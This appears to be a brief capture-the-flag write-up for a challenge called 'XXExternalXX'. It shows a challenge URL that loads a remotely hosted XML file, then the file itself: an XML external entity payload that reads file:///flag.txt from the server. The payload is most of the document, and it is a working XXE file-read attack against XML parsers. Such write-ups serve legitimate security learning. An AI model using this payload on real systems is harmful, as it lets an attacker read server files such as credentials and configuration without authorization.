# XXExternalXX

http://xxexternalxx.sharkyctf.xyz/?xml=http://empty.jack.SECRET_REDACTED_BY_ANTIGRAVITY3.xml

file:
```
<?xml version="1.0" ?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM 'file:///flag.txt'>]>
<root><data>&xxe;</data></root>
```